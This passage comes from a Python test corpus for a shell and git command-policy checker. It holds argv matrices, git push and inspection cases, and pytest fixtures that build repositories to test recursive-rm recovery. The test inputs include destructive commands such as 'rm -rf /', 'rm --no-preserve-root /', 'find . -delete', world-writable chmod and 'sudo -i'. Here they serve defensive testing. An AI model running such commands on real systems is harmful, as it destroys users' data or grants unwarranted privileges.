    ["grep", "-r", "pat", "dir"],
    ["grep", "-rn", "p", "."],
    ["file", "f"],
    ["du", "-sh", "d"],
    ["wc", "-l", "f"],
    ["diff", "a", "b"],
    ["tree", "d"],
    ["more", "f"],
    # find.
    ["find", ".", "-name", "*.py"],
    ["find", ".", "-exec", "rm", "{}", ";"],
    ["find", ".", "-delete"],
    ["find", "d", "-exec", "cmd", "{}", "+"],
    # rm / chmod / chown / mv / cp / ln / install / truncate.
    ["rm", "-r", "dir"],
    ["rm", "-rf", "/"],
    ["rm", "--no-preserve-root", "/"],
    ["rm", "-f", "f"],
    ["rm", "--", "-f"],
    ["rm", "-d", "d"],
    ["chmod", "+x", "f"],
    ["chmod", "-R", "755", "d"],
    ["chmod", "u+x", "f"],
    ["chmod", "755", "f"],
    ["chmod", "0777", "f"],
    ["chmod", "07777", "f"],
    ["chmod", "-R", "a+x", "d"],
    ["chown", "-R", "root", "f"],
    ["chown", "root", "f"],
    ["mv", "a", "b"],
    ["cp", "a", "b"],
    ["cp", "-r", "a", "b"],
    ["ln", "-s", "a", "b"],
    ["install", "a", "b"],
    ["install", "-D", "a", "b"],
    ["truncate", "-s", "0", "f"],
    # dd / tee.
    ["dd", "if=a", "of=b"],
    ["dd", "if=", "of="],
    ["tee", "f"],
    ["tee", "-a", "f"],
    # sed / less.
    ["sed", "-i", "s/x/y/", "f"],
    ["sed", "-i.bak", "s/x/y/", "f"],
    ["sed", "--in-place", "s/x/y/", "f"],
    ["sed", "-e", "s/x/y/", "f"],
    ["sed", "-f", "script", "f"],
    ["sed", "-n", "p", "f"],
    ["sed", "s/x/y/", "f", "g"],
    ["sed", "--expression", "s/x/y/", "--file", "s", "f"],
    ["less", "+F", "f"],
    ["less", "+/pat", "f"],
    ["less", "-k", "f"],
    ["less", "+g", "f"],
    ["less", "-o", "log", "f"],
    ["less", "+G", "f"],
    # date / sort / uniq / checksums.
    ["date"],
    ["date", "-s", "now"],
    ["date", "-f", "f"],
    ["date", "--set", "now"],
    ["date", "-j", "-f", "%Y", "2020"],
    ["date", "+%Y-%m-%d"],
    ["sort", "-o", "out", "in"],
    ["sort", "--output", "out", "in"],
    ["sort", "-u", "in"],
    ["uniq", "in"],
    ["uniq", "in", "out"],
    ["uniq", "-c", "in"],
    ["md5sum", "--check", "sums"],
    ["md5sum", "-c", "sums"],
    ["sha256sum", "--check", "s"],
    ["shasum", "-c", "s"],
    # archives.
    ["tar", "-xf", "a.tar"],
    ["tar", "-xf", "a.tar", "-C", "d"],
    ["tar", "--directory", "d", "-xf", "a"],
    ["tar", "-cf", "a.tar", "d"],
    ["tar", "-xf", "a.tgz", "--wildcards", "*"],
    ["unzip", "a.zip", "-d", "d"],
    ["zip", "a.zip", "f"],
    ["zip", "-r", "a.zip", "d"],
    ["7z", "x", "a.7z"],
    ["7za", "a", "a.7z", "f"],
    ["7zr", "x", "a.7z"],
    ["unar", "a.zip"],
    ["zstd", "-d", "f.zst"],
    ["zstdcat", "f.zst"],
    ["unzstd", "f.zst"],
    ["zstdmt", "-d", "f"],
    ["bsdtar", "-xf", "a"],
    ["pax", "-w", "f"],
    # split / csplit / cpio / strip / openssl.
    ["split", "-b", "1k", "f", "p"],
    ["split", "--prefix", "p", "f"],
    ["csplit", "--prefix", "p", "f", "/pat/"],
    ["cpio", "-o", ">", "names"],
    ["cpio", "-i", "<", "archive"],
    ["strip", "bin"],
    ["strip", "-o", "out", "in"],
    ["openssl", "enc", "-out", "f"],
    ["openssl", "--out", "f", "enc"],
    # compilers / linkers / archivers.
    ["gcc", "-o", "bin", "src.c"],
    ["gcc", "-o.bin", "src.c"],
    ["cc", "-o", "bin", "s.c"],
    ["clang", "--output", "bin", "s.c"],
    ["g++", "-o", "bin", "s.cpp"],
    ["clang++", "-o", "bin", "s.cpp"],
    ["c++", "-o", "bin", "s.cpp"],
    ["rustc", "-o", "bin", "s.rs"],
    ["as", "-o", "o", "s"],
    ["ld", "-o", "bin", "o"],
    ["ar", "rcs", "a.a", "o"],
    # xargs / gpg / rsync / patch / iconv / xmllint / mktemp / scp.
    ["xargs", "cmd"],
    ["xargs", "-0", "cmd"],
    ["xargs", "-I{}", "cmd", "{}"],
    ["xargs", "-d", "\n", "cmd"],
    ["gpg", "--sign", "f"],
    ["gpg", "-o", "f", "--sign"],
    ["rsync", "a", "b"],
    ["rsync", "-a", "src/", "dst"],
    ["rsync", "--rsync-path", "cmd", "a", "b"],
    ["rsync", "-e", "ssh", "a", "b"],
    ["patch", "f.diff"],
    ["patch", "-d", "d", "f.diff"],
    ["patch", "--dry-run", "f"],
    ["iconv", "-f", "UTF-8", "-t", "LATIN1", "f"],
    ["xmllint", "--output", "f", "x.xml"],
    ["mktemp"],
    ["mktemp", "tpl"],
    ["mktemp", "-d"],
    ["mktemp", "--suffix", "s", "t"],
    ["scp", "a", "b"],
    ["scp", "-r", "a", "b"],
    ["scp", "-P", "22", "a", "b"],
    ["scp", "-o", "Opt=v", "a", "b"],
    # Package managers outside the executor registry path.
    ["npm", "install", "pkg"],
    ["npm", "run", "build"],
    ["pip", "install", "pkg"],
    ["pip", "install", "-r", "r.txt"],
    ["pip3", "install", "--user", "pkg"],
    ["pnpm", "add", "pkg"],
    ["yarn", "add", "pkg"],
    ["bun", "install", "pkg"],
    ["poetry", "add", "pkg"],
    # Degenerate controls.
    ["x"],
    ["ls"],
    # sg: group wrapper whose -c payload is shell source;
    # every other form is unmodeled and fails closed.
    ["sg", "docker", "-c", "git status"],
    ["sg", "docker", "-c", "git reset --hard"],
    ["sg", "-c", "echo hi"],
    ["sg", "docker", "bash", "-c", "x"],
    ["sg", "docker", "git", "status"],
    ["sg", "docker"],
    ["sg"],
    ["sg", "docker", "-c"],
    ["sg", "docker", "-c-x"],
    # v0.5.9 P2-d: sudo -u is a transparent user wrapper whose wrapped
    # command argv is re-analyzed; every other sudo form is unmodeled and
    # fails closed.
    ["sudo", "-u", "nobody", "git", "status"],
    ["sudo", "-u", "nobody", "git", "push"],
    ["sudo", "--user", "nobody", "git", "status"],
    ["sudo", "--user=nobody", "git", "status"],
    ["sudo", "-unobody", "git", "status"],
    ["sudo", "-u", "nobody", "--", "git", "status"],
    ["sudo", "-u", "nobody", "-E", "git", "status"],
    ["sudo", "git", "status"],
    ["sudo", "-i"],
    ["sudo", "-u", "nobody"],
    ["sudo", "-u"],
    ["sudo"],
]

# v0.5.9 P2-d: symbolic-ref is modeled by mode — the read form (exactly
# one operand, no write marker) resolves like a reader; the write forms
# and unmodeled forms are denied. The matrix appends AFTER the other
# matrices so the recorded policy/paths/git_pure rows keep their ids.
SYMBOLIC_REF_ARGV: list[list[str]] = [
    ["git", "symbolic-ref", "HEAD"],
    ["git", "symbolic-ref", "-q", "HEAD"],
    ["git", "symbolic-ref", "--short", "HEAD"],
    ["git", "symbolic-ref", "--recurse", "HEAD"],
    ["git", "symbolic-ref", "--no-recurse", "HEAD"],
    ["git", "symbolic-ref", "HEAD", "refs/heads/main"],
    ["git", "symbolic-ref", "-m", "reason", "HEAD", "refs/heads/main"],
    ["git", "symbolic-ref", "-d", "HEAD"],
    ["git", "symbolic-ref", "--delete", "HEAD"],
    ["git", "symbolic-ref"],
    ["git", "symbolic-ref", "--bogus", "HEAD"],
]


def _dedup(argv_lists: list[list[str]]) -> list[list[str]]:
    seen: set[tuple[str, ...]] = set()
    unique: list[list[str]] = []
    for argv in argv_lists:
        key = tuple(argv)
        if key not in seen:
            seen.add(key)
            unique.append(argv)
    return unique


ALL_POLICY_ARGV = _dedup([
    *GIT_ARGV,
    *EXECUTOR_ARGV,
    *TOOL_ARGV,
    *SYMBOLIC_REF_ARGV,
    # Interpreter-flag recognition (v0.5.9 P2-f): each interpreter's own
    # boolean long flag belongs to the interpreter invocation, not the
    # harness executor.
    ["python", "--version"],
    ["python3", "--version"],
    ["pypy", "--version"],
    ["pypy3", "--version"],
    ["node", "--version"],
    ["perl", "--version"],
    ["ruby", "--version"],
])
GIT_PURE_ARGV = _dedup([
    *GIT_ARGV,
    ["ls", "-l"],
    ["cat", "f"],
    ["uv", "run", "cmd"],
    *SYMBOLIC_REF_ARGV,
])
DIVERGENCE_ARGV: list[list[str]] = [
    ["git", "-C"],
    ["git", "--git-dir"],
    ["git", "--work-tree"],
    ["git", "-c"],
    ["GIT", "log"],
    ["GIT", "push", "origin", "main"],
    ["Git", "status"],
]

ARGV_HELPER_CASES: list[dict[str, Any]] = [
    *(
        {"call": "command_name", "token": token}
        for token in [
            "git",
            "GIT",
            "Git",
            "gIt",
            "/usr/bin/git",
            "/usr/bin/GIT",
            "./git",
            "../bin/git",
            "git.exe",
            "~/bin/git",
            '"git"',
            "'git'",
            "git ",
            " git",
            "  git  ",
            "C:\\Tools\\git.exe",
            "sh",
            "SH",
            "Ls",
            "lS",
            "/usr/local/bin/python3",
            "python3.12",
            "python3.12.exe",
            "",
            "-",
            "--",
            "a/b/c/ls",
            "git/",
            "/git",
            "GIT.EXE",
            "Git.Exe",
        ]
    ),
    *(
        {"call": "options_before_double_dash", "args": args}
        for args in [
            [],
            ["--"],
            ["a", "--"],
            ["--", "a"],
            ["a", "b"],
            ["-x", "--", "-y"],
            ["--", "--"],
            ["a", "--", "b", "--", "c"],
            ["--", "a", "--", "b"],
        ]
    ),
    *(
        {"call": "matches_command_prefix", "tokens": tokens, "pattern": pattern}
        for tokens, pattern in [
            (["git", "log"], ["git"]),
            (["GIT", "log"], ["git"]),
            (["/usr/bin/git", "log"], ["git"]),
            (["git"], ["git", "log"]),
            ([], ["git"]),
            (["git", "log"], ["GIT"]),
            (["git", "log"], ["/usr/bin/git"]),
            (["git", "x"], ["git", "y"]),
            (["git", "--", "log"], ["git", "--"]),
            (["ls", "-l"], ["ls", "-l", "-a"]),
            (["git", "log"], ["git", "log"]),
            (["git", "log", "x"], ["git", "log"]),
        ]
    ),
]

GIT_INSPECTION_CASES: list[dict[str, Any]] = [
    {"argv": ["git", "log"], "cwd": "plain-repo"},
    {"argv": ["git", "status"], "cwd": "plain-repo"},
    {"argv": ["git", "diff", "HEAD"], "cwd": "plain-repo"},
    {"argv": ["git", "log", "--oneline"], "cwd": "plain-repo"},
    {"argv": ["git", "--no-pager", "log"], "cwd": "plain-repo"},
    {"argv": ["git", "-P", "log"], "cwd": "plain-repo"},
    {"argv": ["git", "commit", "-m", "x"], "cwd": "plain-repo"},
    {"argv": ["git", "push", "origin", "main"], "cwd": "plain-repo"},
    {"argv": ["git", "-C", "nested", "log"], "cwd": "plain-repo"},
    {"argv": ["git", "log"], "cwd": "plain-repo/nested"},
    {
        "argv": ["git", "log"],
        "cwd": "plain-repo",
        "relocation": {"cwd_paths": ["nested"]},
    },
    {"argv": ["git", "log"], "cwd": "plain-repo", "relocation": {"git_dir": ".git"}},
    {
        "argv": ["git", "log"],
        "cwd": "plain-repo",
        "relocation": {"work_tree": "nested"},
    },
    {
        "argv": ["git", "log"],
        "cwd": "plain-repo",
        "relocation": {"cwd_paths": ["../no-repo"]},
    },
    {
        "argv": ["git", "log"],
        "cwd": "plain-repo",
        "relocation": {"git_dir": "../separate-gitdir"},
    },
    {"argv": ["git", "--git-dir", ".git", "log"], "cwd": "plain-repo"},
    {
        "argv": ["git", "--git-dir", ".git", "--work-tree", "nested", "log"],
        "cwd": "plain-repo",
    },
    {"argv": ["git", "-C", "nested", "-C", "..", "log"], "cwd": "plain-repo"},
    {"argv": ["git", "-C"], "cwd": "plain-repo"},
    {"argv": ["git", "log"], "cwd": "pager-repo"},
    {"argv": ["git", "status"], "cwd": "pager-repo"},
    {"argv": ["git", "diff"], "cwd": "pager-repo"},
    {"argv": ["git", "--no-pager", "log"], "cwd": "pager-repo"},
    {"argv": ["git", "-P", "log"], "cwd": "pager-repo"},
    {"argv": ["git", "--paginate", "log"], "cwd": "pager-repo"},
    {"argv": ["git", "commit", "-m", "x"], "cwd": "pager-repo"},
    {"argv": ["git", "diff"], "cwd": "pager-section-repo"},
    {"argv": ["git", "log"], "cwd": "pager-section-repo"},
    {"argv": ["git", "status"], "cwd": "hook-repo"},
    {"argv": ["git", "log"], "cwd": "hook-repo"},
    {"argv": ["git", "diff", "HEAD"], "cwd": "hook-repo"},
    {"argv": ["git", "commit", "-m", "x"], "cwd": "hook-repo"},
    {"argv": ["git", "status"], "cwd": "hookspath-repo"},
    {"argv": ["git", "log"], "cwd": "hookspath-repo"},
    {"argv": ["git", "log"], "cwd": "unreadable-config-repo"},
    {"argv": ["git", "status"], "cwd": "unreadable-config-repo"},
    {"argv": ["git", "log"], "cwd": "gitfile-repo"},
    {"argv": ["git", "status"], "cwd": "gitfile-repo"},
    {"argv": ["git", "log"], "cwd": "separate-gitdir"},
    {"argv": ["git", "status"], "cwd": "separate-gitdir"},
    {"argv": ["git", "log"], "cwd": "linked-worktree"},
    {"argv": ["git", "status"], "cwd": "linked-worktree"},
    {"argv": ["git", "log"], "cwd": "main-repo"},
    {"argv": ["git", "status"], "cwd": "main-repo"},
    {"argv": ["git", "--no-pager", "log"], "cwd": "main-repo"},
    {"argv": ["git", "log"], "cwd": "bare-repo"},
    {"argv": ["git", "status"], "cwd": "bare-repo"},
    {"argv": ["git", "log"], "cwd": "no-repo"},
    {"argv": ["git", "-C", "../plain-repo", "log"], "cwd": "no-repo"},
    {
        "argv": ["git", "log"],
        "cwd": "no-repo",
        "relocation": {"git_dir": "../plain-repo/.git"},
    },
    {"argv": ["git", "log"], "cwd": "garbage-gitfile-repo"},
    {"argv": ["git", "log"], "cwd": "dangling-gitfile-repo"},
    {"argv": ["git", "status"], "cwd": "dangling-gitfile-repo"},
]

PUSH_RISK_CASES: list[dict[str, Any]] = [
    {
        "argv": ["git", "push", "origin", "main"],
        "cwd": "plain-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["origin", "main"],
        },
    },
    {
        "argv": ["git", "push", "upstream", "main"],
        "cwd": "plain-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["upstream", "main"],
        },
    },
    {
        "argv": ["git", "push", "https://x/y", "main"],
        "cwd": "plain-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["https://x/y", "main"],
        },
    },
    {
        "argv": ["git", "push", "--repo", "url", "main"],
        "cwd": "plain-repo",
        "call": {
            "subcommand": "push",
            "options": ["--repo"],
            "option_values": [["--repo", "url"]],
            "operands": ["main"],
        },
    },
    {
        "argv": ["git", "push"],
        "cwd": "plain-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": [],
        },
    },
    {
        "argv": ["git", "fetch", "origin"],
        "cwd": "plain-repo",
        "call": {
            "subcommand": "fetch",
            "options": [],
            "option_values": [],
            "operands": ["origin"],
        },
    },
    {
        "argv": ["git", "push", "origin", "main"],
        "cwd": "unreadable-config-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["origin", "main"],
        },
    },
    {
        "argv": ["git", "push", "origin", "main"],
        "cwd": "no-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["origin", "main"],
        },
    },
    {
        "argv": ["git", "push", "upstream", "main"],
        "cwd": "bare-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["upstream", "main"],
        },
    },
    {
        "argv": ["git", "push", "origin", "main"],
        "cwd": "bare-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["origin", "main"],
        },
    },
    {
        "argv": ["git", "push", "origin", "main"],
        "cwd": "garbage-gitfile-repo",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["origin", "main"],
        },
    },
    {
        "argv": ["git", "push", "origin", "main"],
        "cwd": "linked-worktree",
        "call": {
            "subcommand": "push",
            "options": [],
            "option_values": [],
            "operands": ["origin", "main"],
        },
    },
]

# ---------------------------------------------------------------------------
# Recording helpers
# ---------------------------------------------------------------------------


def to_jsonable(value: Any) -> Any:
    """Convert a recorded value into a deterministic JSON-compatible structure."""
    if dataclasses.is_dataclass(value) and not isinstance(value, type):
        return {
            field.name: to_jsonable(getattr(value, field.name))
            for field in dataclasses.fields(value)
        }
    if isinstance(value, (set, frozenset)):
        return sorted(to_jsonable(item) for item in value)
    if isinstance(value, (list, tuple)):
        return [to_jsonable(item) for item in value]
    if isinstance(value, Path):
        return str(value)
    if isinstance(value, dict):
        return {
            str(key): to_jsonable(item)
            for key, item in sorted(value.items(), key=lambda pair: str(pair[0]))
        }
    return value


def call_json(call: Callable[[], Any]) -> dict[str, Any]:
    """Record one call as ``{"value": ...}`` or ``{"exception": ...}``."""
    try:
        return {"value": to_jsonable(call())}
    except Exception as error:
        return {"exception": {"type": type(error).__name__, "message": str(error)}}


def rel_path(path: Path, root: Path) -> str:
    """Render one fixture path relative to the fixture root."""
    try:
        return str(Path(path).relative_to(root))
    except ValueError:
        return str(path).replace(str(root), FIXTURES_TOKEN)


def rel_paths(paths: Any, root: Path) -> list[str]:
    """Render a path collection sorted by its relative spelling."""
    return sorted(rel_path(path, root) for path in paths)


def scope_json(scope: Any, root: Path) -> dict[str, Any] | None:
    """Render one RepositoryScope with fixture-relative paths."""
    if scope is None:
        return None
    return {
        "git_dir": rel_path(scope.git_dir, root),
        "work_tree": (
            None if scope.work_tree is None else rel_path(scope.work_tree, root)
        ),
    }


def build_relocation(spec: dict[str, Any] | None) -> GitRepositoryRelocation:
    """Build the relocation one corpus entry resolves its scope with."""
    if not spec:
        return GitRepositoryRelocation()
    return GitRepositoryRelocation(
        cwd_paths=tuple(spec.get("cwd_paths", ())),
        git_dir=spec.get("git_dir"),
        work_tree=spec.get("work_tree"),
    )


def materialize_fixtures(source: Path, dest: Path) -> Path:
    """Copy the committed fixture tree and turn ``git-dir`` into ``.git``.

    Git refuses to track paths under a ``.git`` component, so the committed
    tree stores every ``.git`` directory/file under the placeholder name
    ``git-dir``; the rename below produces the real marker layout the policy
    module inspects. Copy modes are preserved, so executable hooks stay
    executable.
    """
    root = dest / "fixtures"
    shutil.copytree(source, root)
    placeholders = sorted(
        root.rglob(PLACEHOLDER), key=lambda path: len(path.parts), reverse=True
    )
    for path in placeholders:
        path.rename(path.with_name(GIT_MARKER))
    return root.resolve()


@pytest.fixture(scope="session")
def fixtures_root(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """The materialized fixture tree shared by all corpus tests."""
    root = materialize_fixtures(FIXTURES_SOURCE, tmp_path_factory.mktemp("corpus"))
    build_recursive_rm_fixtures(root)
    build_bare_metadata_fixtures(root)
    build_curl_destination_fixtures(root)
    return root


# ---------------------------------------------------------------------------
# v0.5.9 P2-c: recursive-rm git-state fixtures (permission family)
# ---------------------------------------------------------------------------


def _git(cwd: Path, *args: str, check: bool = True) -> None:
    subprocess.run(
        ["git", "-C", str(cwd), *args], check=check, capture_output=True, text=True
    )


def build_recursive_rm_fixtures(root: Path) -> None:
    """Build the real git repositories the recursive-rm permission rows resolve
    against.

    The committed fixture tree cannot hold a ``.git`` directory (git refuses
    to track paths under one), so the rm fixtures are real repositories,
    built deterministically inside the materialized temp root: the recorded
    observations name no commit hashes, branches, or absolute paths, so the
    build is replay-stable.
    """

    def init_repo(path: Path) -> None:
        path.mkdir(parents=True, exist_ok=True)
        _git(path, "init", "-q")
        _git(path, "config", "user.email", "corpus@example.com")
        _git(path, "config", "user.name", "Corpus")

    def commit_all(path: Path, message: str) -> None:
        _git(path, "add", "-A")
        _git(path, "commit", "-q", "-m", message)

    # Paired clean/unsaved fixtures: a tracked build/ directory the rm
    # operand names — metadata-excluding and recovery-established.
    clean = root / "rm-clean"
    init_repo(clean)
    (clean / "build").mkdir()
    (clean / "build" / "artifact.txt").write_text("artifact\n", encoding="utf-8")
    (clean / "tracked.txt").write_text("tracked\n", encoding="utf-8")
    commit_all(clean, "tracked content")

    unsaved = root / "rm-unsaved"
    init_repo(unsaved)
    (unsaved / "build").mkdir()
    (unsaved / "build" / "artifact.txt").write_text("artifact\n", encoding="utf-8")
    (unsaved / "tracked.txt").write_text("tracked\n", encoding="utf-8")
    commit_all(unsaved, "tracked content")
    (unsaved / "tracked.txt").write_text("unsaved\n", encoding="utf-8")

    # A rebase in progress: recovery unestablishable for the assessed repo.
    rebase = root / "rm-rebase"
    init_repo(rebase)
    (rebase / "base.txt").write_text("base\n", encoding="utf-8")
    commit_all(rebase, "base")
    default_branch = subprocess.run(
        ["git", "-C", str(rebase), "branch", "--show-current"],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()
    _git(rebase, "checkout", "-q", "-b", "feature")
    (rebase / "base.txt").write_text("feature\n", encoding="utf-8")
    commit_all(rebase, "feature")
    _git(rebase, "checkout", "-q", default_branch)
    (rebase / "base.txt").write_text("mainline\n", encoding="utf-8")
    commit_all(rebase, "mainline")
    _git(rebase, "checkout", "-q", "feature")
    # The conflicting rebase leaves rebase-merge/ in progress.
    _git(rebase, "rebase", default_branch, check=False)
    assert (rebase / ".git" / "rebase-merge").is_dir()

    # Ignored nested repositories: unpushed (recovery unestablished) and
    # pushed to a real bare remote (recovery established). The bare remote
    # sits beside its outer repository: inside the operand it would be a
    # second nested repository whose own recovery the analysis would have
    # to establish.
    def outer_with_nested(name: str, *, remote: str | None) -> None:
        outer = root / name
        init_repo(outer)
        (outer / "build").mkdir()
        (outer / "build" / "artifact.txt").write_text("artifact\n", encoding="utf-8")
        (outer / ".gitignore").write_text("vendor/\n", encoding="utf-8")
        commit_all(outer, "outer content")
        nested = outer / "vendor" / "nested"
        init_repo(nested)
        (nested / "nested.txt").write_text("nested\n", encoding="utf-8")
        commit_all(nested, "nested content")
        if remote == "bare":
            bare = root.parent / f"{name}-origin.git"
            bare.mkdir(parents=True)
            _git(bare, "init", "-q", "--bare")
            _git(nested, "remote", "add", "origin", str(bare))
            _git(nested, "push", "-q", "origin", "HEAD:refs/heads/main")
        elif remote == "refs-only":
            # A remote-tracking ref is local metadata, not a remote copy of
            # the commits; no remote is configured, so recovery stays
            # unestablished.
            _git(nested, "update-ref", "refs/remotes/origin/main", "HEAD")

    outer_with_nested("rm-nested-unpushed", remote=None)
    outer_with_nested("rm-nested-pushed", remote="bare")

    # R10 fixtures: recovery evidence inside the deletion footprint. A
    # clean nested repository under an ignored vendor/ directory whose
    # configured remote is genuinely fetchable and holds the commits, but
    # whose fetch target the deletion itself destroys: a bundle file
    # beneath the operand (spelled absolute and relative to the nested
    # repository), a file:// URL to a bare repository beneath the operand
    # (the bare repository carries the commits and has an outside backup
    # of its own, so its own recovery is established), and a bundle in a
    # sibling ignored directory a second operand deletes. The controls
    # keep the fetchable target outside the footprint (beside the outer
    # repository) and pin the remote-scheme asymmetry.
    # R12 fixtures (deep-review round 5): the percent-encoded file://
    # remote. git percent-decodes file:// URLs at connect time, so an
    # encoded component names the DECODED path: the inside fixture's remote
    # resolves to the nested repository's own git dir beneath the operand
    # (genuinely fetchable, but the deletion destroys it together with the
    # repository), and the outside fixture's remote resolves to a bare
    # repository beside the outer repository, pushed through the encoded
    # URL.
    def outer_with_nested_recovery(name: str, *, remote: str, ignore: str) -> None:
        outer = root / name
        init_repo(outer)
        (outer / "build").mkdir()
        (outer / "build" / "artifact.txt").write_text("artifact\n", encoding="utf-8")
        (outer / ".gitignore").write_text(ignore, encoding="utf-8")
        commit_all(outer, "outer content")
        nested = outer / "vendor" / "nested"
        init_repo(nested)
        (nested / "nested.txt").write_text("nested\n", encoding="utf-8")
        commit_all(nested, "nested content")
        if remote == "bundle-inside":
            bundle = outer / "vendor" / "nested.bundle"
            _git(nested, "bundle", "create", str(bundle), "HEAD")
            _git(nested, "remote", "add", "origin", str(bundle))
            _git(nested, "update-ref", "refs/remotes/origin/main", "HEAD")
        elif remote == "bundle-inside-relative":
            bundle = outer / "vendor" / "nested.bundle"
            _git(nested, "bundle", "create", str(bundle), "HEAD")
            _git(nested, "remote", "add", "origin", "../nested.bundle")
            _git(nested, "update-ref", "refs/remotes/origin/main", "HEAD")
        elif remote == "bundle-sibling":
            backup = outer / "backup"
            backup.mkdir()
            bundle = backup / "nested.bundle"
            _git(nested, "bundle", "create", str(bundle), "HEAD")
            _git(nested, "remote", "add", "origin", str(bundle))
            _git(nested, "update-ref", "refs/remotes/origin/main", "HEAD")
        elif remote == "bundle-outside":
            bundle = root.parent / f"{name}-origin.bundle"
            _git(nested, "bundle", "create", str(bundle), "HEAD")
            _git(nested, "remote", "add", "origin", str(bundle))
            _git(nested, "update-ref", "refs/remotes/origin/main", "HEAD")
        elif remote == "file-url-repo-inside":
            bare = outer / "vendor" / "origin.git"
            bare.mkdir(parents=True)
            _git(bare, "init", "-q", "--bare")
            _git(nested, "remote", "add", "origin", f"file://{bare}")
            _git(nested, "push", "-q", "origin", "HEAD:refs/heads/main")
            backup = root.parent / f"{name}-backup.git"
            backup.mkdir(parents=True)
            _git(backup, "init", "-q", "--bare")
            _git(bare, "remote", "add", "backup", str(backup))
            _git(bare, "push", "-q", "backup", "refs/heads/main:refs/heads/main")
        elif remote == "https":
            _git(nested, "remote", "add", "origin", "https://example.invalid/repo.git")
            _git(nested, "update-ref", "refs/remotes/origin/main", "HEAD")
        elif remote == "file-url-pct-inside":
            # R12: git percent-decodes file:// URLs at connect time, so
            # the encoded component names the DECODED path — the nested
            # repository's own git dir, inside the operand the deletion
            # destroys (fetchable, so only the survival containment gates).
            _git(
                nested,
                "remote",
                "add",
                "origin",
                f"file://{outer}/%76endor/nested/.git",
            )
            _git(nested, "update-ref", "refs/remotes/origin/main", "HEAD")
        elif remote in {"alias-inside", "file-url-alias-inside", "plain-inside"}:
            (outer / "vendor" / "deep").mkdir()
            (outer / "alias").symlink_to("vendor/deep", target_is_directory=True)
            target = (
                f"{outer}/vendor/nested/.git"
                if remote == "plain-inside"
                else f"{outer}/alias/../nested/.git"
            )
            if remote == "file-url-alias-inside":
                target = f"file://{target}"
            _git(nested, "remote", "add", "origin", target)
            _git(nested, "update-ref", "refs/remotes/origin/main", "HEAD")
        elif remote == "file-url-pct-outside":
            # R12 control: the same encoded spelling whose decoded target
            # lies outside the footprint — a bare repository beside the
            # outer repository, pushed through the encoded URL.
            bare = root.parent / f"{name}-origin.git"
            bare.mkdir(parents=True)
            _git(bare, "init", "-q", "--bare")
            _git(
                nested,
                "remote",
                "add",
                "origin",
                f"file://{root.parent}/%72{bare.name[1:]}",
            )
            _git(nested, "push", "-q", "origin", "HEAD:refs/heads/main")

    outer_with_nested_recovery(
        "rm-nested-bundle-inside", remote="bundle-inside", ignore="vendor/\n"
    )
    outer_with_nested_recovery(
        "rm-nested-bundle-inside-relative",
        remote="bundle-inside-relative",
        ignore="vendor/\n",
    )
    outer_with_nested_recovery(
        "rm-nested-bundle-sibling", remote="bundle-sibling", ignore="vendor/\nbackup/\n"
    )
    outer_with_nested_recovery(
        "rm-nested-bundle-outside", remote="bundle-outside", ignore="vendor/\n"
    )
    outer_with_nested_recovery(
        "rm-nested-file-url-inside", remote="file-url-repo-inside", ignore="vendor/\n"
    )
    outer_with_nested_recovery("rm-nested-https", remote="https", ignore="vendor/\n")
    outer_with_nested_recovery(
        "rm-nested-pct-inside", remote="file-url-pct-inside", ignore="vendor/\n"
    )
    outer_with_nested_recovery(
        "rm-nested-pct-outside", remote="file-url-pct-outside", ignore="vendor/\n"
    )

    for name, remote in (
        ("rm-nested-alias-inside", "alias-inside"),
        ("rm-nested-file-alias-inside", "file-url-alias-inside"),
        ("rm-nested-plain-inside", "plain-inside"),
    ):
        outer_with_nested_recovery(name, remote=remote, ignore="vendor/\nalias\n")

    # A linked worktree: the common directory lives in the main repository.
    linked = root / "rm-linked"
    init_repo(linked)
    (linked / "tracked.txt").write_text("tracked\n", encoding="utf-8")
    commit_all(linked, "tracked content")
    _git(linked, "worktree", "add", "-q", str(root / "rm-linked-wt"), "-b", "linked")

    # Fail-closed git-state fixtures (v0.5.9 P3-c). A directory governed by
    # no repository: the rm analysis cannot establish a repository, so it
    # fails closed. A repository whose Git metadata is corrupted
    # deterministically: the unusable HEAD makes every sanitized git state
    # probe exit nonzero, so the state reads as unestablishable and the
    # analysis fails closed — not a permission-dependent unreadable
    # directory, a deterministic git failure.
    norepo = root / "rm-norepo"
    (norepo / "build").mkdir(parents=True)
    (norepo / "build" / "artifact.txt").write_text("artifact\n", encoding="utf-8")
    corrupt = root / "rm-corrupt"
    init_repo(corrupt)
    (corrupt / "build").mkdir()
    (corrupt / "build" / "artifact.txt").write_text("artifact\n", encoding="utf-8")
    (corrupt / "tracked.txt").write_text("tracked\n", encoding="utf-8")
    commit_all(corrupt, "tracked content")
    (corrupt / ".git" / "HEAD").write_text("corrupt", encoding="utf-8")


# The nested-bare-repository loose object the R5 rows name: the content
# address of a fixed payload, asserted so a hash change fails the build
# loudly instead of silently recording wrong rows.
_BARE_NESTED_OBJECT = "52b73111a94b9a2ddcfccc5b083861293c0fc7aa"


def build_bare_metadata_fixtures(root: Path) -> None:
    """Build the nested-bare-repository fixture the R5 permission rows resolve
    against (deep-review round 3).

    A git-clean repository ignoring a bare repository that carries one loose
    object and no remote (its commits are unpushed), plus a symlink naming
    the bare repository through a symlinked directory component. Both stay
    ignored, keeping the assessed tree clean for the recursive-rm controls.
    The recorded observations name no commit hashes, branches, or absolute
    paths, so the build is replay-stable.
    """
    repo = root / "bare-nested"
    repo.mkdir(parents=True)
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "corpus@example.com")
    _git(repo, "config", "user.name", "Corpus")
    (repo / "build").mkdir()
    (repo / "build" / "artifact.txt").write_text("artifact\n", encoding="utf-8")
    (repo / "tracked.txt").write_text("tracked\n", encoding="utf-8")
    (repo / ".gitignore").write_text("backup.git/\nlink\n", encoding="utf-8")
